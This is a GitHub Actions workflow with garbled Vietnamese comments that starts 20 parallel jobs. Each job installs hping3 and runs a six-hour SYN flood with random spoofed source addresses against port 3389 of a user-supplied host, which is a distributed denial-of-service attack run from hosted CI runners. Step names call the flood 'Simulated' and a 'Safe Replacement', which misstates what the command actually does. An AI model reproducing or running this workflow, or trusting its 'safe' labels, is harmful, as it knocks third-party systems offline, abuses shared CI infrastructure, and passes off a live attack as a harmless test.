name: 'Self'

# KÃ­ch hoáº¡t workflow báº±ng tay vÃ  nháº­n input
on:
  workflow_dispatch:
    inputs:
      target_host:
        description: 'Äá»‹a chá»‰ IP hoáº·c Hostname Ä‘Ã­ch'
        required: true
        default: '127.0.0.1' # Thay báº±ng Ä‘á»‹a chá»‰ IP/Host há»£p lá»‡, vÃ´ háº¡i Ä‘á»ƒ kiá»ƒm tra
        
jobs:
  # Äá»‹nh nghÄ©a 20 jobs cháº¡y song song
  parallel_test:
    # Chá»‰ Ä‘á»‹nh Self-Hosted Runner
    # Thay 'my-runner-label' báº±ng label thá»±c táº¿ cá»§a self-hosted runner cá»§a báº¡n
    runs-on: ubuntu-latest

    strategy:
      matrix:
        job_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
      fail-fast: false 
      
    steps:
      - name: ğŸ“ Log Job Start Info
        run: |
          echo "Báº¯t Ä‘áº§u Job ${{ matrix.job_id }} trÃªn Self-Hosted Runner."
          echo "Host Ä‘Ã­ch: ${{ github.event.inputs.target_host }}"
          
      - name: âš™ï¸ Run Simulated Hping3 Command (Safe Replacement)
        run: |
          TARGET="${{ github.event.inputs.target_host }}"
          JOB_ID="${{ matrix.job_id }}"
          echo "Job $JOB_ID: Minh há»a lá»‡nh hping3 vá»›i nguá»“n ngáº«u nhiÃªn ."
          sudo apt install -y hping3
          timeout 360m sudo hping3 -S -V --rand-source --flood -p 3389 $TARGET
      - name: âœ… Log Job End
        run: echo "HoÃ n thÃ nh Job ${{ matrix.job_id }}."

